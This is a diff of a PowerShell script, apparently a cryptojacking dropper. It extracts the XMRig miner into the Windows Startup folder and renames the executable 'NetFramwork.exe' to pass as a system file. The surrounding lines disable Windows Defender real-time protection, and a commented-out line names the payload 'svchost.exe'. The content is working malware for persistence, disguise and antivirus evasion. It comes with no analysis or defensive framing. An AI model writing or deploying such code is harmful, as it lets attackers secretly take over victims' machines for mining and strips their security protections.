@@ -123,7 +123,9 @@ $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
 $destinationPath = "$hiddenDir\xmrig-6.22.2\NetFramwork.exe"#Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath $hiddenDir
+
+mkdir "$hiddenDir\NetFramwork"
+Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$hiddenDir\NetFramwork"
 
 # Create hidden directory
 if (-not (Test-Path $hiddenDir)) {
@@ -142,7 +144,7 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New bat file not found at the specified path."
 }
 
-Rename-Item -Path "$hiddenDir\xmrig-6.22.2\xmrig.exe" -NewName "NetFramwork.exe"
+Rename-Item -Path "$hiddenDir\NetFramwork\xmrig.exe" -NewName "NetFramwork.exe"
 
 # Disable Windows Defender temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
